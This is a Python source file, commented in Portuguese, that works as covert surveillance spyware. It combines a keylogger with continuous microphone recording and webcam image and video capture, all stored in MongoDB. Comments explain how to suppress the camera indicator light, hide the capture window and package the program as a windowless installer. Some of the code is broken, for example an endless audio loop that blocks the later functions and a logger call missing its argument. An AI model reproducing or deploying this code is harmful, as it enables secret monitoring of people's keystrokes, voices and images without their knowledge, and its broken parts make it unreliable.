import cv2
import gridfs
import logging
import os
import pyaudio
import pymongo
from pynput import keyboard

# Para criar um instalável do código na máquina:
#     pyinstaller seu_codigo.py
#     --onefile --windowed --icon=icone.ico

# Conectar ao banco de dados MongoDB
try:
    client = pymongo.MongoClient("mongodb://localhost:27017")
    db = client["mydatabase"]
    collection = db.get_collection("system_data")
    if collection is None: 
        collection = db.create_collection("system_data")
except pymongo.errors.ConnectionError as e:
    print("Erro ao conectar ao MongoDB:", e)
    # Lógica para lidar com o erro de conexão, se necessário

# Criar uma instância do GridFS
fs = gridfs.GridFS(db, collection="video_data")

# Função para capturar eventos de teclado
def on_keyboard_press(key):
    data = {'event_type': 'keyboard', 'key': str(key)}
    collection.insert_one(data)

# Função para gravar áudio do microfone
def record_audio():
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

    frames = []

    while True:
        data = stream.read(CHUNK)
        frames.append(data)

        # Lógica para salvar os frames de áudio no banco de dados
        # Aqui está um exemplo de como salvar os frames em uma coleção específica
        audio_data = {'frames': frames}
        audio_collection = db["audio_data"]
        audio_collection.insert_one(audio_data)

    stream.stop_stream()
    stream.close()
    audio.terminate()


# Função para capturar imagens da câmera
def capture_images():
    camera = cv2.VideoCapture(0)
    while True:
        ret, frame = camera.read()
        if not ret:
            break

        # Lógica para salvar as imagens no banco de dados
        # Aqui está um exemplo de como salvar as imagens em uma coleção específica
        image_data = {'image': frame}
        image_collection = db["image_data"]
        image_collection.insert_one(image_data)

    camera.release()
    
def capture_video():
    # Configurações do vídeo
    WIDTH = 640
    HEIGHT = 480
    FPS = 30

    # Criação do objeto VideoCapture com a flag CAP_DSHOW
    camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)

    # Configuração do tamanho do vídeo
    camera.set(cv2.CAP_PROP_FRAME_WIDTH, WIDTH)
    camera.set(cv2.CAP_PROP_FRAME_HEIGHT, HEIGHT)
    camera.set(cv2.CAP_PROP_FPS, FPS)

    # Desabilita a luz da câmera
    camera.set(cv2.CAP_PROP_AUTOFOCUS, 0)
    camera.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0)
    camera.set(cv2.CAP_PROP_EXPOSURE, -6)

    video_filename = "video.mp4"
    out = cv2.VideoWriter(video_filename, cv2.VideoWriter_fourcc(*"mp4v"), FPS, (WIDTH, HEIGHT))

    while True:
        ret, frame = camera.read()
        if not ret:
            break

        # Salva o frame no arquivo de vídeo
        out.write(frame)

        if cv2.waitKey(1) == ord('q'):
            break

    out.release()
    camera.release()

    # Salva o vídeo no GridFS
    with open(video_filename, "rb") as video_file:
        fs.put(video_file, filename=video_filename)

    # Remove o arquivo de vídeo local
    os.remove(video_filename)

    cv2.destroyAllWindows()
    
# Neste exemplo, algumas modificações foram feitas na função capture_video() para desativar a luz da câmera e ocultar a exibição da janela de captura:

#       O objeto camera é criado usando a flag cv2.CAP_DSHOW, que permite desativar a exibição da janela de captura.
#       As configurações do tamanho do vídeo, largura (WIDTH) e altura (HEIGHT), são definidas antes do loop de captura.
#       A luz da câmera é desabilitada ajustando as propriedades cv2.CAP_PROP_AUTOFOCUS, cv2.CAP_PROP_AUTO_EXPOSURE e cv2.CAP_PROP_EXPOSURE. No exemplo, a exposição é fixada em um valor específico (-6), mas você pode experimentar diferentes valores para obter o resultado desejado.

# Dessa forma, a captura de vídeo será realizada sem acionar a luz da câmera e sem exibir a janela de captura na tela.

def logger(message):
    # Configuração do logger
    logging.basicConfig(filename='system_logs.txt', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Exemplo de captura de logs
    logging.info('Mensagem de informação')
    logging.warning('Mensagem de aviso')
    logging.error('Mensagem de erro')
    # Lógica para salvar os logs no banco de dados
    # Aqui está um exemplo de como salvar os logs em uma coleção específica
    log_data = {'log_message': message}
    log_collection = db["log_data"]
    log_collection.insert_one(log_data)
    
# Iniciar a captura de eventos de teclado
keyboard_listener = keyboard.Listener(on_press=on_keyboard_press)
keyboard_listener.start()

# Iniciar a gravação de áudio
record_audio()

# Iniciar a captura de imagens
capture_images()

# Iniciar a captura de vídeo:
capture_video()

# Aguardar a interrupção do programa
keyboard_listener.join()

#iniciar o transferidor de logs do sistema
logger()